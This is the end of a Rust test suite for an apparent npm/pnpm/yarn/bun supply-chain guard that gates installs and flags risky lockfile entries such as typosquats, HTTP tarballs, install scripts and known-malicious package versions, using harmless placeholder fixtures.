            "react".to_string(),
        ];

        let staged = npm_staging_args(&args);

        assert_eq!(
            staged
                .iter()
                .filter(|arg| *arg == "--ignore-scripts")
                .count(),
            1
        );
        assert!(staged.contains(&"--package-lock-only".to_string()));
        assert!(staged.contains(&"--fund=false".to_string()));
        assert!(staged.contains(&"--audit=false".to_string()));
    }

    #[test]
    fn package_manager_gate_matrix_matches_install_commands() {
        assert!(should_gate_package_manager_command(
            "npm",
            &["install".to_string()]
        ));
        assert!(should_gate_package_manager_command(
            "npm",
            &["ci".to_string()]
        ));
        assert!(should_gate_package_manager_command(
            "pnpm",
            &["add".to_string(), "react".to_string()]
        ));
        assert!(should_gate_package_manager_command(
            "yarn",
            &["upgrade".to_string()]
        ));
        assert!(should_gate_package_manager_command(
            "bun",
            &["add".to_string(), "react".to_string()]
        ));
        assert_eq!(
            lockfiles_for_package_manager("bun"),
            vec![PathBuf::from("bun.lock"), PathBuf::from("bun.lockb")]
        );
        assert!(!should_gate_package_manager_command(
            "npm",
            &["uninstall".to_string(), "react".to_string()]
        ));
    }

    #[test]
    fn report_args_parse_json_format_and_package_spec() {
        let args = ReportArgs::try_parse_from([
            "mcaifee report",
            "--format",
            "json",
            "--paranoia",
            "reactt",
        ])
        .unwrap();

        assert_eq!(args.format, OutputFormat::Json);
        assert!(args.paranoia);
        assert_eq!(args.targets, vec!["reactt".to_string()]);
    }

    #[test]
    fn source_catalog_lists_major_external_feeds() {
        let sources = source_catalog(true, None);
        let names = sources
            .iter()
            .map(|source| source.name)
            .collect::<HashSet<_>>();

        assert!(names.contains("npm audit"));
        assert!(names.contains("OSV.dev"));
        assert!(names.contains("OpenSSF malicious-packages"));
        assert!(names.contains("GitHub Advisory Database"));
        assert!(names.contains("Socket.dev"));
        assert!(names.contains("OpenSSF Scorecard"));
        assert!(names.contains("Phylum research"));
        assert!(names.contains("Aikido Security Intel"));
        assert!(names.contains("StepSecurity research"));
        assert!(sources
            .iter()
            .any(|source| source.name == "npm registry metadata"
                && source.status == "queried-when-applicable"));
    }

    #[test]
    fn imports_osv_malicious_package_records() {
        let dir = tempfile::tempdir().unwrap();
        let osv_path = dir.path().join("MAL-0001.json");
        write!(
            fs::File::create(&osv_path).unwrap(),
            r#"{{
              "id": "MAL-0001",
              "summary": "malicious install script",
              "aliases": ["GHSA-test"],
              "affected": [{{
                "package": {{"ecosystem": "npm", "name": "badpkg"}},
                "versions": ["1.0.0"]
              }}],
              "references": [{{"type": "WEB", "url": "https://example.com/mal"}}]
            }}"#
        )
        .unwrap();

        let records = import_osv_source_records(dir.path(), "OpenSSF malicious-packages").unwrap();

        assert_eq!(records.len(), 1);
        assert_eq!(records[0].advisory_id, "MAL-0001");
        assert_eq!(records[0].package, "badpkg");
        assert_eq!(records[0].versions, vec!["1.0.0"]);
        assert_eq!(records[0].severity, "critical");
    }

    #[test]
    fn source_db_findings_match_lockfile_versions() {
        let dir = tempfile::tempdir().unwrap();
        let lock_path = dir.path().join("package-lock.json");
        write!(
            fs::File::create(&lock_path).unwrap(),
            r#"{{
                "lockfileVersion": 3,
                "packages": {{
                    "": {{"name": "demo"}},
                    "node_modules/badpkg": {{
                        "version": "1.0.0",
                        "resolved": "https://registry.npmjs.org/badpkg/-/badpkg-1.0.0.tgz",
                        "integrity": "sha512-test"
                    }},
                    "node_modules/badpkg-safe": {{
                        "version": "2.0.0",
                        "resolved": "https://registry.npmjs.org/badpkg-safe/-/badpkg-safe-2.0.0.tgz",
                        "integrity": "sha512-test"
                    }}
                }}
            }}"#
        )
        .unwrap();
        let source_db = SourceDb {
            schema_version: 1,
            updated_at: Utc::now().to_rfc3339(),
            records: vec![SourceDbRecord {
                source: "OpenSSF malicious-packages".to_string(),
                source_url: "https://example.com/mal".to_string(),
                advisory_id: "MAL-0001".to_string(),
                package: "badpkg".to_string(),
                ecosystem: "npm".to_string(),
                versions: vec!["1.0.0".to_string()],
                severity: "critical".to_string(),
                confidence: "confirmed".to_string(),
                summary: "malicious install script".to_string(),
                aliases: vec!["GHSA-test".to_string()],
            }],
        };
        let allowed_hosts = HashSet::from(["registry.npmjs.org".to_string()]);
        let mut findings = Vec::new();

        analyze_lockfile(&lock_path, &mut findings, &allowed_hosts, Some(&source_db));

        assert!(findings
            .iter()
            .any(|finding| finding.code == "source_db_match"
                && finding.target.contains("node_modules/badpkg")
                && finding.severity == Severity::Critical));
        assert!(!findings
            .iter()
            .any(|finding| finding.code == "source_db_match"
                && finding.target.contains("badpkg-safe")));
    }

    #[test]
    fn source_db_freshness_uses_twenty_four_hour_window() {
        let dir = tempfile::tempdir().unwrap();
        let fresh_path = dir.path().join("fresh-db.json");
        let stale_path = dir.path().join("stale-db.json");
        let missing_path = dir.path().join("missing-db.json");

        write_source_db_with_updated_at(&fresh_path, Utc::now() - Duration::hours(2));
        write_source_db_with_updated_at(&stale_path, Utc::now() - Duration::hours(25));

        assert!(!source_db_needs_update(
            &fresh_path,
            Duration::hours(SOURCE_DB_MAX_AGE_HOURS)
        ));
        assert!(source_db_needs_update(
            &stale_path,
            Duration::hours(SOURCE_DB_MAX_AGE_HOURS)
        ));
        assert!(source_db_needs_update(
            &missing_path,
            Duration::hours(SOURCE_DB_MAX_AGE_HOURS)
        ));
    }

    fn write_source_db_with_updated_at(path: &Path, updated_at: DateTime<Utc>) {
        let db = SourceDb {
            schema_version: 1,
            updated_at: updated_at.to_rfc3339(),
            records: Vec::new(),
        };
        fs::write(path, serde_json::to_vec(&db).unwrap()).unwrap();
    }

    #[test]
    fn shell_scripts_wrap_and_disable_package_managers() {
        let init = shell_init_script(ShellKind::Zsh);
        assert!(init.contains("export MCAIFEE_SHELL_ACTIVE=1"));
        assert!(init.contains("mcaifee npm"));
        assert!(init.contains("mcaifee pnpm"));
        assert!(init.contains("mcaifee yarn"));
        assert!(init.contains("mcaifee bun"));

        let disable = shell_disable_script(ShellKind::Zsh);
        assert!(disable.contains("unset -f npm"));
        assert!(disable.contains("unset -f bun"));
        assert!(disable.contains("unset MCAIFEE_SHELL_ACTIVE"));

        let fish_disable = shell_disable_script(ShellKind::Fish);
        assert!(fish_disable.contains("functions -e pnpm"));
        assert!(fish_disable.contains("functions -e bun"));
        assert!(fish_disable.contains("set -e MCAIFEE_SHELL_ACTIVE"));
    }

    #[test]
    fn summarizes_lockfile_risk_counts() {
        let dir = tempfile::tempdir().unwrap();
        let lock_path = dir.path().join("package-lock.json");
        write!(
            fs::File::create(&lock_path).unwrap(),
            r#"{{
                "lockfileVersion": 3,
                "packages": {{
                    "": {{"name": "demo"}},
                    "node_modules/ok": {{
                        "version": "1.0.0",
                        "resolved": "https://registry.npmjs.org/ok/-/ok-1.0.0.tgz",
                        "integrity": "sha512-test"
                    }},
                    "node_modules/suspicious": {{
                        "version": "1.0.0",
                        "resolved": "git+ssh://git@example.com/suspicious.git",
                        "hasInstallScript": true
                    }}
                }}
            }}"#
        )
        .unwrap();
        let allowed_hosts = HashSet::from(["registry.npmjs.org".to_string()]);

        let summary = summarize_lockfile(&lock_path, &allowed_hosts);

        assert!(summary.exists);
        assert_eq!(summary.package_count, 2);
        assert_eq!(summary.install_script_count, 1);
        assert_eq!(summary.non_registry_sources, 1);
    }

    #[test]
    fn analyzes_npm_shrinkwrap_v1_deep_dependencies() {
        let dir = tempfile::tempdir().unwrap();
        let lock_path = dir.path().join("npm-shrinkwrap.json");
        write!(
            fs::File::create(&lock_path).unwrap(),
            r#"{{
                "name": "demo",
                "lockfileVersion": 1,
                "dependencies": {{
                    "parent": {{
                        "version": "1.0.0",
                        "resolved": "https://registry.npmjs.org/parent/-/parent-1.0.0.tgz",
                        "integrity": "sha512-parent",
                        "dependencies": {{
                            "badpkg": {{
                                "version": "1.0.0",
                                "resolved": "http://example.com/badpkg.tgz",
                                "hasInstallScript": true
                            }}
                        }}
                    }}
                }}
            }}"#
        )
        .unwrap();
        let allowed_hosts = HashSet::from(["registry.npmjs.org".to_string()]);
        let mut findings = Vec::new();

        analyze_lockfile(&lock_path, &mut findings, &allowed_hosts, None);

        assert!(findings.iter().any(|finding| finding
            .target
            .contains("dependencies.parent.badpkg")
            && finding.code == "http_tarball"));
        assert!(findings.iter().any(|finding| finding
            .target
            .contains("dependencies.parent.badpkg")
            && finding.code == "lockfile_install_script"));
    }

    #[test]
    fn default_report_candidates_include_all_supported_lockfiles() {
        let candidates = default_lockfile_candidates();

        for expected in [
            "npm-shrinkwrap.json",
            "package-lock.json",
            "pnpm-lock.yaml",
            "yarn.lock",
            "bun.lock",
            "bun.lockb",
        ] {
            assert!(candidates
                .iter()
                .any(|path| path == &PathBuf::from(expected)));
        }
    }

    #[test]
    fn analyzes_pnpm_transitive_lockfile_entries() {
        let dir = tempfile::tempdir().unwrap();
        let lock_path = dir.path().join("pnpm-lock.yaml");
        write!(
            fs::File::create(&lock_path).unwrap(),
            r#"
lockfileVersion: '9.0'

packages:
  badpkg@1.0.0:
    resolution: {{tarball: http://example.com/badpkg.tgz}}
    requiresBuild: true
  reactt@1.0.0:
    resolution: {{integrity: sha512-test}}
"#
        )
        .unwrap();
        let allowed_hosts = HashSet::from(["registry.npmjs.org".to_string()]);
        let mut findings = Vec::new();

        analyze_lockfile(&lock_path, &mut findings, &allowed_hosts, None);
        let summary = summarize_lockfile(&lock_path, &allowed_hosts);

        assert_eq!(summary.package_count, 2);
        assert_eq!(summary.install_script_count, 1);
        assert_eq!(summary.non_registry_sources, 1);
        assert!(findings
            .iter()
            .any(|finding| finding.code == "http_tarball"));
        assert!(findings
            .iter()
            .any(|finding| finding.code == "lockfile_install_script"));
        assert!(findings
            .iter()
            .any(|finding| finding.code == "possible_typosquat"));
    }

    #[test]
    fn lockfile_parser_matrix_has_named_tests_for_ci() {
        assert!(is_npm_json_lockfile(Path::new("package-lock.json")));
        assert!(is_npm_json_lockfile(Path::new("npm-shrinkwrap.json")));
        assert_eq!(
            parse_pnpm_lockfile_signals(
                Path::new("pnpm-lock.yaml"),
                "packages:\n  ok@1.0.0:\n    resolution: {integrity: sha512-test}\n",
                &HashSet::from(["registry.npmjs.org".to_string()])
            )
            .package_count,
            1
        );
        assert_eq!(
            parse_yarn_lockfile_signals(
                Path::new("yarn.lock"),
                "\"ok@npm:1.0.0\":\n  version \"1.0.0\"\n",
                &HashSet::from(["registry.npmjs.org".to_string()])
            )
            .package_count,
            1
        );
        assert_eq!(
            parse_bun_lockfile_signals(
                Path::new("bun.lock"),
                "{\n  \"packages\": {\n    \"ok\": [\"ok@npm:1.0.0\", {}, \"sha512-test\"]\n  }\n}\n",
                &HashSet::from(["registry.npmjs.org".to_string()])
            )
            .package_count,
            1
        );
        assert!(is_bun_binary_lockfile(Path::new("bun.lockb")));
    }

    #[test]
    fn analyzes_yarn_transitive_lockfile_entries() {
        let dir = tempfile::tempdir().unwrap();
        let lock_path = dir.path().join("yarn.lock");
        write!(
            fs::File::create(&lock_path).unwrap(),
            r#"
"left-pad@https://example.com/left-pad.tgz":
  version "1.0.0"
  resolved "https://example.com/left-pad.tgz"

"fs@npm:1.0.0":
  version "1.0.0"
  resolution: "fs@npm:1.0.0"
"#
        )
        .unwrap();
        let allowed_hosts = HashSet::from(["registry.npmjs.org".to_string()]);
        let mut findings = Vec::new();

        analyze_lockfile(&lock_path, &mut findings, &allowed_hosts, None);
        let summary = summarize_lockfile(&lock_path, &allowed_hosts);

        assert_eq!(summary.package_count, 2);
        assert_eq!(summary.non_registry_sources, 1);
        assert!(findings
            .iter()
            .any(|finding| finding.code == "non_allowed_registry"));
        assert!(findings
            .iter()
            .any(|finding| finding.code == "missing_integrity"));
        assert!(findings
            .iter()
            .any(|finding| finding.code == "core_module_shadow"));
    }

    #[test]
    fn analyzes_bun_text_lockfile_entries() {
        let dir = tempfile::tempdir().unwrap();
        let lock_path = dir.path().join("bun.lock");
        write!(
            fs::File::create(&lock_path).unwrap(),
            r#"{{
  "lockfileVersion": 1,
  "packages": {{
    "left-pad": ["left-pad@https://example.com/left-pad.tgz"],
    "reactt": ["reactt@npm:1.0.0", {{}}, "sha512-test"],
    "scripted": ["scripted@npm:1.0.0", {{"trustedDependencies": ["native-helper"]}}, "sha512-test"]
  }}
}}"#
        )
        .unwrap();
        let allowed_hosts = HashSet::from(["registry.npmjs.org".to_string()]);
        let mut findings = Vec::new();

        analyze_lockfile(&lock_path, &mut findings, &allowed_hosts, None);
        let summary = summarize_lockfile(&lock_path, &allowed_hosts);

        assert_eq!(summary.package_count, 3);
        assert_eq!(summary.install_script_count, 1);
        assert_eq!(summary.non_registry_sources, 1);
        assert!(findings
            .iter()
            .any(|finding| finding.code == "non_allowed_registry"));
        assert!(findings
            .iter()
            .any(|finding| finding.code == "missing_integrity"));
        assert!(findings
            .iter()
            .any(|finding| finding.code == "possible_typosquat"));
        assert!(findings
            .iter()
            .any(|finding| finding.code == "lockfile_install_script"));
    }

    #[test]
    fn flags_bun_binary_lockfile_for_migration() {
        let dir = tempfile::tempdir().unwrap();
        let lock_path = dir.path().join("bun.lockb");
        fs::write(&lock_path, [0_u8, 1, 2, 3]).unwrap();
        let allowed_hosts = HashSet::from(["registry.npmjs.org".to_string()]);
        let mut findings = Vec::new();

        analyze_lockfile(&lock_path, &mut findings, &allowed_hosts, None);

        assert!(findings
            .iter()
            .any(|finding| finding.code == "binary_bun_lockfile"));
    }
}
